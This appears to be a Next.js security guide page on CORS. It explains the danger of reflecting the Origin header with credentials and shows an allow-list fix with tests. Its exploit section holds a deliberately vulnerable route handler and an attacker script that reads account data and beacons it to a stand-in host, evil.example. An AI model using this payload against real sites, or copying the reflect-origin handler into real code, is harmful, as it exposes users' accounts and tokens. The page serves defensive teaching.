---
title: CORS
description: Reflecting the request Origin with credentials turns any site into a trusted client — use an explicit allow-list, Vary Origin, and a real preflight handler.
group: nextjs-security
order: 90
status: current
related: [nextjs-backend/route-handlers, nextjs-backend/proxy, nextjs-mutations/server-actions, nextjs-security/input-validation]
---

## Overview

Cross-Origin Resource Sharing (CORS) is the browser's rule for when a page on
one origin may read a response from another. Your Route Handler opts in by
sending `Access-Control-Allow-Origin`. The dangerous shortcut is to *reflect*
whatever `Origin` the request carried, especially together with
`Access-Control-Allow-Credentials: true`, which tells the browser to send and
expose cookies. That combination makes every site on the internet a trusted,
credentialed client of your API.

This page shows the reflect-any-origin bug, exploits it from an attacker page,
and fixes it with an explicit allow-list, `Vary: Origin`, and a proper `OPTIONS`
preflight handler.

> [!NOTE]
> CORS applies to **Route Handlers** and other cross-origin fetches. **Server
> Actions are not CORS-controlled**: they enforce their own same-origin check by
> comparing `Origin` to `Host`, widened only by
> `experimental.serverActions.allowedOrigins` in `next.config`. Do not try to
> "open up" a Server Action with CORS headers.

## The threat

CORS does not protect your server; it protects your users' browsers. A missing
or wrong CORS policy does not stop `curl` (which ignores CORS entirely). It
decides whether a *browser* on another origin can read the response, and whether
it may attach the user's cookies.

The failure is reflecting the origin with credentials:

```text
Access-Control-Allow-Origin: <the request's own Origin header, echoed back>
Access-Control-Allow-Credentials: true
```

Now `https://evil.example` is an allowed, credentialed origin. When a logged-in
user visits the attacker's page, their browser makes a cookie-bearing request to
your API and hands the response to attacker JavaScript. The spec forbids the
wildcard `*` together with credentials precisely to stop this; reflecting the
origin sidesteps that guard while keeping its danger.

## Exploit

```ts file="app/api/account/route.ts" vulnerable
import type { NextRequest } from 'next/server';
import { verifySession } from '@/lib/dal';

export async function GET(request: NextRequest) {
  const session = await verifySession();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401 });

  const origin = request.headers.get('origin') ?? '*';
  return Response.json(
    { email: session.email, apiToken: session.apiToken },
    {
      headers: {
        // Reflects any origin, and allows credentials with it.
        'Access-Control-Allow-Origin': origin,
        'Access-Control-Allow-Credentials': 'true',
      },
    },
  );
}
```

The attacker hosts this on their own origin:

```html file="attack.html"
<script>
  fetch('https://app.example.com/api/account', { credentials: 'include' })
    .then((r) => r.json())
    .then((data) => navigator.sendBeacon('https://evil.example/steal', JSON.stringify(data)));
</script>
```

A logged-in victim who opens the attacker's page has their account email and API
token exfiltrated. Confirm the headers with a spoofed `Origin`:

```bash
curl -s -D - -o /dev/null https://app.example.com/api/account \
  -H 'Origin: https://evil.example' -H 'Cookie: session=<a-session>'
# access-control-allow-origin: https://evil.example
# access-control-allow-credentials: true
```

## Fix

Decide the origin from an allow-list, echo it back only on a match, always send
`Vary: Origin`, and answer the preflight in an `OPTIONS` handler:

```ts file="lib/cors.ts"
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

// Returns the CORS headers for an allowed origin, or just `Vary` for others.
// Vary: Origin is always sent so caches never reuse one origin's response for
// another.
export function corsHeaders(origin: string | null): Headers {
  const headers = new Headers({ Vary: 'Origin' });
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    headers.set('Access-Control-Allow-Origin', origin);
    headers.set('Access-Control-Allow-Credentials', 'true');
  }
  return headers;
}

export function preflightHeaders(origin: string | null): Headers {
  const headers = corsHeaders(origin);
  headers.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  headers.set('Access-Control-Max-Age', '600');
  return headers;
}
```

```ts file="app/api/account/route.ts"
import type { NextRequest } from 'next/server';
import { verifySession } from '@/lib/dal';
import { corsHeaders, preflightHeaders } from '@/lib/cors';

export async function OPTIONS(request: NextRequest) {
  return new Response(null, { status: 204, headers: preflightHeaders(request.headers.get('origin')) });
}

export async function GET(request: NextRequest) {
  const headers = corsHeaders(request.headers.get('origin'));

  const session = await verifySession();
  if (!session) return Response.json({ error: 'Unauthorized' }, { status: 401, headers });

  return Response.json({ email: session.email }, { headers });
}
```

Why this works:

- **Only known origins are echoed.** An unknown origin gets no
  `Access-Control-Allow-Origin`, so the browser blocks the cross-origin read.
  `curl` still gets the data, which is fine, because CORS was never protecting
  the server, and this endpoint still requires a session.
- **`*` and credentials are never combined.** Credentials are allowed only
  alongside a specific echoed origin.
- **`Vary: Origin` on every response** stops a shared cache or CDN from serving
  the `app.example.com` response (with its allow header) to a request from a
  different origin.
- **A real `OPTIONS` handler** answers the preflight the browser sends before any
  non-simple request (custom headers, `PUT`/`DELETE`, JSON with credentials),
  with the allowed methods, headers and a cache lifetime. Without it, those
  requests never reach `GET`/`POST`.
- **The response body shrank.** The account no longer returns `apiToken`; see
  [Environment variable leaks](./environment-variable-leaks.md) and
  [IDOR](./idor.md) for shaping responses.

For CORS across *many* routes, set the same logic once in `proxy.ts` instead of
per handler; the [Proxy](../nextjs-backend/proxy.md) page shows the shape.

## Verify the fix

An allowed origin is echoed; an attacker origin is not; the preflight answers
correctly:

```bash
BASE=https://app.example.com

# Allowed origin -> echoed.
curl -s -D - -o /dev/null "$BASE/api/account" -H 'Origin: https://app.example.com' -H 'Cookie: session=<s>' \
  | grep -i 'access-control-allow-origin'
# access-control-allow-origin: https://app.example.com

# Attacker origin -> no allow-origin header at all.
curl -s -D - -o /dev/null "$BASE/api/account" -H 'Origin: https://evil.example' -H 'Cookie: session=<s>' \
  | grep -ci 'access-control-allow-origin'
# 0

# Preflight.
curl -s -D - -o /dev/null -X OPTIONS "$BASE/api/account" \
  -H 'Origin: https://app.example.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type'
# access-control-allow-origin: https://app.example.com
# access-control-allow-methods: GET, POST, OPTIONS
```

Pin it with a test that both an attacker origin is refused and `Vary: Origin` is
present:

```ts file="e2e/cors.spec.ts"
import { expect, test } from '@playwright/test';

test('an attacker origin is not allowed, and Vary: Origin is set', async ({ request }) => {
  const response = await request.get('/api/account', {
    headers: { Origin: 'https://evil.example', Cookie: 'session=demo' },
  });
  expect(response.headers()['access-control-allow-origin']).toBeUndefined();
  expect(response.headers()['vary']).toContain('Origin');
});
```

## Common patterns

- **Public, no-credentials API.** If the data is public and no cookies are
  involved, `Access-Control-Allow-Origin: *` with **no**
  `Access-Control-Allow-Credentials` is correct and simplest.
- **Same-origin only.** If nothing cross-origin needs the API, send no CORS
  headers at all. The browser's same-origin policy already allows your own pages.
- **Config-level CORS.** `next.config` `headers()` can add static CORS headers to
  matched paths, but it cannot echo a dynamic origin. Use a handler or `proxy.ts`
  for an allow-list.

## Common mistakes

**Reflecting `Origin` with credentials.** The core bug. Match against an
allow-list.

**`Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials:
true`.** Browsers reject the pair, so people "fix" it by reflecting the origin,
recreating the vulnerability. If you need credentials, name the origins.

**Forgetting `Vary: Origin`.** A cache can then serve an allowed origin's
response, allow-header and all, to another origin.

**No `OPTIONS` handler.** Non-simple cross-origin requests fail the preflight and
never run, which looks like a random CORS bug.

**Thinking CORS secures the endpoint.** It governs browsers only. Keep the
authentication, authorization and validation checks; CORS is in addition to
them.

**Trying to CORS-enable a Server Action.** Actions use a same-origin check, not
CORS. Cross-origin callers belong in a Route Handler.

## Related topics

- [Route Handlers](../nextjs-backend/route-handlers.md) — methods, `OPTIONS` and
  response headers.
- [Proxy](../nextjs-backend/proxy.md) — applying one CORS policy across many
  routes.
- [Server Actions](../nextjs-mutations/server-actions.md) — the same-origin
  model that replaces CORS for actions.
- [Input validation](./input-validation.md) — validating the cross-origin
  requests you do accept.
- [Directives](../server-react/directives.md) — the Server/Client boundary that
  Server Actions cross.
